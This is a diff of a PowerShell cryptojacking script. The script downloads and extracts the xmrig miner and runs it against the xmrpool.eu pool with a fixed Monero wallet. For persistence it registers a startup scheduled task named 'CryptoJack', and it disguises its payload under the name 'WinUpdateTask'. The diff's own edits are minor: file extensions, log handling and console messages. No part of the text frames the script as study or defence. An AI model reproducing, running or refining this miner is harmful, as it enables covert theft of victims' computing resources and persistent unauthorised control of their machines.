@@ -53,7 +53,7 @@ function runScript
     
     $outputPath = $ScriptDir + "\test.zip"
     $destinationPath = $ScriptDir
-    $FilePath = $ScriptDir + "\WinUpdateTask.bat"
+    $FilePath = $ScriptDir + "\WinUpdateTask.ps1"
 
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($download, $outputPath)
@@ -66,7 +66,7 @@ function runScript
     }
     else
     {
-        Write-Host "Files Downloaded :D ..."
+        Write-Host "Files downloaded"
         Clear-Host
 
         # Extract the xmrig zip
@@ -84,12 +84,14 @@ function runScript
         # Replace wallet address below with your own Monero wallet
         # Define the log file path
         $logPath = Join-Path $destinationPath "miner.log"
+        $logPathErr = Join-Path $destinationPath "miner_err.log"
+
 
         # Start XMRig with output and error logging
         Start-Process -FilePath $xmrigPath `
             -ArgumentList "-o xmrpool.eu:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD -p x" `
             -RedirectStandardOutput $logPath `
-            -RedirectStandardError $logPath `
+            -RedirectStandardError $logPathErr `
             -NoNewWindow
 
         # Keep scheduled task as before to run on startup
@@ -98,8 +100,9 @@ function runScript
         Register-ScheduledTask -AsJob -Trigger $trigger -Action $action -TaskName CryptoJack -Force
         Start-ScheduledTask -TaskName CryptoJack
 
-        Write-Host "Mining started!"
+        Write-Host "Mining started"
     }
+
 }
 
 
@@ -110,4 +113,3 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 {
     runScript 
 } 
-
